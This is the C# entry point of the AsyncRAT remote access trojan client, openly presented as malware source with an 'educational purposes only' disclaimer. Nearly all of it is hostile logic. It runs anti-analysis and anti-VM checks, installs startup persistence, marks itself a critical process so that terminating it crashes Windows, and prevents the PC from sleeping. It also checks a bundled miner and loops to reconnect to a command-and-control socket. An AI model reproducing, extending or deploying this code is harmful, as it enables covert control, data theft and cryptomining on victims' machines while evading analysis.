using System.Threading;
using Client.Connection;
using Client.Install;
using System;
using Client.Helper;

/* 
       │ Author       : NYAN CAT
       │ Name         : AsyncRAT  Simple RAT
       │ Contact Me   : https:github.com/NYAN-x-CAT

       This program Is distributed for educational purposes only.
*/

namespace Client
{
    public class Program
    {
        public static void Main()
        {
            Thread.Sleep(2500);
            if (!Settings.InitializeSettings()) Environment.Exit(0);

            try
            {
                if (!MutexControl.CreateMutex()) //if current payload is a duplicate
                    Environment.Exit(0);

                if (Convert.ToBoolean(Settings.Anti)) //run anti-virtual environment
                    Anti_Analysis.RunAntiAnalysis();

                if (Convert.ToBoolean(Settings.Install)) //drop payload [persistence]
                    NormalStartup.Install();

                if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin()) //active critical process
                    ProcessCritical.Set();

                Methods.PreventSleep(); //prevent pc to idle\sleep

                new CheckMiner().GetProcess(); //check miner status
            }
            catch { }

            while (true) // ~ loop to check socket status
            {
                if (!ClientSocket.IsConnected)
                {
                    ClientSocket.Reconnect();
                    ClientSocket.InitializeClient();
                }
                Thread.Sleep(new Random().Next(1000, 5000));
            }
        }
    }
}